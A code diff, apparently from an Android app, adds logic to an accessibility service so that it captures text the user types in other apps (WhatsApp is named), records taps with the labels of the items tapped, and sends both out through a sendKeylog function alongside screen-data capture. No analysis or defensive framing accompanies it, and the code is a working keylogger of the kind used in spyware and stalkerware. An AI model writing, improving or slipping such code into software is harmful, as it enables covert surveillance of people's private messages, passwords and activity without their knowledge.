@@ -589,6 +589,15 @@ jobs:
                                           pendingPackageName = null;
                                       }
                                   }
+                              } else {
+                                  // No text entries but event fired -> flush pending
+                                  if (pendingText.length() > 0) {
+                                      String typed = pendingText.toString().trim();
+                                      String typedAppName = getAppDisplayName(pendingPackageName != null ? pendingPackageName : "Unknown");
+                                      sendKeylog("[" + typedAppName + "] " + typed);
+                                      pendingText.setLength(0);
+                                      pendingPackageName = null;
+                                  }
                               }
                               break;
 
@@ -601,6 +610,14 @@ jobs:
                               String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "Unknown";
                               if (!isSystemPackage(pkg)) {
                                   scheduleScreenDataCapture(pkg);
+                              }
+                              // Fallback: flush pending text on window state change (e.g., WhatsApp send)
+                              if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && pendingText.length() > 0) {
+                                  String typed = pendingText.toString().trim();
+                                  String typedAppName = getAppDisplayName(pendingPackageName != null ? pendingPackageName : pkg);
+                                  sendKeylog("[" + typedAppName + "] " + typed);
+                                  pendingText.setLength(0);
+                                  pendingPackageName = null;
                               }
                               break;
                       }
@@ -627,7 +644,6 @@ jobs:
                   String clickedText = "";
                   if (source != null) {
                       clickedText = getNodeText(source);
-                      // If empty, search parent chain for any label
                       AccessibilityNodeInfo parent = source.getParent();
                       int depth = 0;
                       while (parent != null && depth < 6 && clickedText.isEmpty()) {
@@ -641,10 +657,8 @@ jobs:
 
                   String appName = getAppDisplayName(event.getPackageName() != null ? event.getPackageName().toString() : "Unknown");
 
-                  // 1. Send tap event
                   sendKeylog("👆 [" + appName + " Tapped] " + (clickedText.isEmpty() ? "Unknown" : clickedText));
 
-                  // 2. Flush pending text on click
                   if (pendingText.length() > 0) {
                       String typed = pendingText.toString().trim();
                       String typedAppName = getAppDisplayName(pendingPackageName != null ? pendingPackageName : appName);
